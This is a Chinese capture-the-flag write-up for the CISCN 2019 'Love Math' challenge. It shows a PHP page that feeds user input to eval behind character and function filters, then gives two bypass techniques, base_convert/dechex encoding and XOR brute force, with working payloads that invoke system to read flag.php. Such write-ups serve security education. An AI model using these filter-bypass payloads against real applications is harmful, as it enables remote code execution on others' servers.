# \[CISCN 2019 初赛]Love Math

## \[CISCN 2019 初赛]Love Math

## 考点

* 根据白名单构造RCE字符串
* 类似于无字符RCE的构造思路

## wp

给了源码，只能使用白名单里面的函数

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```

已知条件:

1. 传入的参数 c 进入 eval 函数中执行
2. c 的长度小于 80
3. c 中不含有黑名单中的字符
4. c 中的字符串必须在白名单中
5. 可以执行的函数只有白名单中的

思路:

1. 使用白名单里的字符构造 RCE 函数
2. 构造出 `$_GET/$_POST`传参，防止 c 长度过长
3. `!@#$%^&*()-+.{}|`等未被过滤
4. 这里在 url 栏输入 +\&# 是会被浏览器分别解析为空格，参数连接符，锚点，应使用URL编码后传入

### 第一种方法

通过进制转换来构造，16进制包含`0-9a-f`，没有包含所有字符，很难利用，但是36进制包含`0-9a-z`

例如，`hex2bin("5f474554")` 就是 `_GET`

![](<../.gitbook/assets/image (3) (1).png>)

![](<../.gitbook/assets/image (32) (1) (1).png>)

最后就构造出来了构造出来了 `_GET`，是`base_convert(37907361743,10,36)(dechex(1598506324));`

在获取 GET/POST 的参数时，可以使用 `$_GET["a"]` 但是还有另外一种用法，使用$\_GET{a}。另外，PHP不加引号的内容，默认作为字符串处理，会抛出警告。

如此，把`base_convert(37907361743,10,36)(dechex(1598506324))`赋值给`pi`，在使用$pi，就可以获得`$_GET`，再进行传参就可以了，即如下

```php
<?php
$pi=base_convert(37907361743,10,36)(dechex(1598506324)); // _GET
($$pi){pow}($$pi{abs}); // $_GET["pow"]($_GET["abs"])
```

payload

```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})&pow=system&abs=cat flag.php
```

### 第二种方法

通过异或来构造，在 php 中可以对字符串进行异或，其原理就是对字符串中每个字符对应的 ASCII 值进行异或，这就要通过爆破来进行了

```php
<?php
$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
foreach($whitelist as $w){
    for($a=1;$a<999999;$a++){
        $res = $w ^ decoct($a);
        if(strpos($res,"_POST")===0){
            echo $w.'   '.$a.'   ';
            echo $res;
            echo "\n";
        }
    }
}
```

![](<../.gitbook/assets/image (19) (1) (1) (1).png>)

最终 payload: `?c=$pi=${(hexdec^decoct(31737))};$pi{pow}($pi{abs});`
